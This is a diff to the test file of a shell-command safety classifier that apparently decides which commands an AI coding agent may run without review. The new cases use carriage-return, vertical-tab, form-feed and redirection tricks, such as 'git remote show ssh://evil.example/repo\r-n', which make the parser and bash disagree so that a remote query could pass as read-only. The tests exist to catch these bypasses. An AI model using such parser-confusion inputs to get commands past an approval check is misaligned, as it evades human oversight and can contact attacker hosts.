@@ -441,6 +441,15 @@ describe('classifyShellCommandSafety', () => {
       "git remote show origin ''-- -n",
       "git remote show origin '-'- -n",
       "git remote show origin $'--' -n",
+      // tree-sitter ends a word at \r, \v and \f, but bash splits only at
+      // space, tab and newline, so git receives `repo<char>-n` as one
+      // argument and still queries the remote (bot round 8 R8-1).
+      'git remote show ssh://evil.example/repo\r-n',
+      'git remote show ssh://evil.example/repo\v-n',
+      'git remote show ssh://evil.example/repo\f-n',
+      // The word after an input redirection is its source, not an argument.
+      'git remote show https://evil.example/leak <<<-n',
+      'git remote show origin < -n',
     ])('routes %j to review instead of auto-running it', async (command) => {
       expect(await classifyShellCommandSafety(command)).toBe('unknown');
       expect(await isShellCommandReadOnlyAST(command)).toBe(false);
@@ -460,6 +469,12 @@ describe('classifyShellCommandSafety', () => {
       'git remote get-url origin',
     ])('keeps %j read-only', async (command) => {
       expect(await classifyShellCommandSafety(command)).toBe('read-only');
+    });
+
+    it('still classifies a write holding a carriage return as a write', async () => {
+      // The \r guard only withholds a read-only verdict, so plan mode keeps
+      // blocking this write instead of asking about it.
+      expect(await classifyShellCommandSafety('rm target\r')).toBe('write');
     });
   });
 
